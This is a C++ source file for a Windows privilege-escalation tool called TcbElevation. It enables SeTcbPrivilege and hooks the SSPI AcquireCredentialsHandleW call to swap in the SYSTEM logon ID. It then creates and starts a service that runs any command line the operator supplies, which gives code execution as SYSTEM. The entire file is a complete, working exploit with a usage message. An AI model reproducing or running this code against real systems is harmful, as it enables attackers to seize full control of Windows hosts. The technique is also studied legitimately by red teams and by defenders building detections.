// TcbElevation - Authors: @splinter_code and @decoder_it

#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <stdio.h>

#pragma comment(lib, "Secur32.lib")

void EnableTcbPrivilege(BOOL enforceCheck);
BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(LPWSTR pszPrincipal, LPWSTR pszPackage, unsigned long fCredentialUse, void* pvLogonId, void* pAuthData, SEC_GET_KEY_FN pGetKeyFn, void* pvGetKeyArgument, PCredHandle phCredential, PTimeStamp ptsExpiry);

int wmain(int argc, wchar_t** argv)
{

    if (argc < 3) {
        printf("usage: TcbElevation.exe [ServiceName] [CmdLine]\n");
        exit(-1);
    }

    EnableTcbPrivilege(TRUE);
    PSecurityFunctionTableW table = InitSecurityInterfaceW();
    table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook; // SSPI hooks trick borrowed from @tiraniddo --> https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82
    
    wchar_t* serviceName = argv[1];
    wchar_t* cmdline = argv[2];

    SC_HANDLE hScm = OpenSCManagerW(L"127.0.0.1", nullptr, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!hScm)
    {
        printf("Error opening SCM %d\n", GetLastError());
        return 1;
    }

    SC_HANDLE hService = CreateService(hScm, serviceName, nullptr, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, cmdline, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!hService)
    {
        printf("Error creating service %d\n", GetLastError());
        return 1;
    }

    if (!StartService(hService, 0, nullptr))
    {
        printf("Error starting service %d\n", GetLastError());
        return 1;
    }

    return 0;
}

BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    PRIVILEGE_SET privs;
    LUID luid;
    BOOL debugPrivEnabled = FALSE;
    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid))
    {
        printf("LookupPrivilegeValueW() failed, error %u\n", GetLastError());
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges() failed, error %u\n", GetLastError());
        return FALSE;
    }
    privs.PrivilegeCount = 1;
    privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privs.Privilege[0].Luid = luid;
    privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!PrivilegeCheck(hToken, &privs, &debugPrivEnabled)) {
        printf("PrivilegeCheck() failed, error %u\n", GetLastError());
        return FALSE;
    }
    if (!debugPrivEnabled)
        return FALSE;
    return TRUE;
}

void EnableTcbPrivilege(BOOL enforceCheck) {
    HANDLE currentProcessToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
    BOOL setPrivilegeSuccess = SetPrivilege(currentProcessToken, (wchar_t*)L"SeTcbPrivilege", TRUE);
    if (enforceCheck && !setPrivilegeSuccess) {
        printf("No SeTcbPrivilege in the token. Exiting...\n");
        exit(-1);
    }
    CloseHandle(currentProcessToken);
}

SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(LPWSTR pszPrincipal, LPWSTR pszPackage, unsigned long fCredentialUse, void* pvLogonId, void* pAuthData, SEC_GET_KEY_FN pGetKeyFn, void* pvGetKeyArgument, PCredHandle phCredential, PTimeStamp ptsExpiry)
{
    LUID logonId;
    ZeroMemory(&logonId, sizeof(LUID));
    logonId.LowPart = 0x3E7; // here we do the Tcb magic using the SYSTEM LUID in pvLogonId of AcquireCredentialsHandleW call
    return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse, &logonId, pAuthData, pGetKeyFn, pvGetKeyArgument, phCredential, ptsExpiry);
}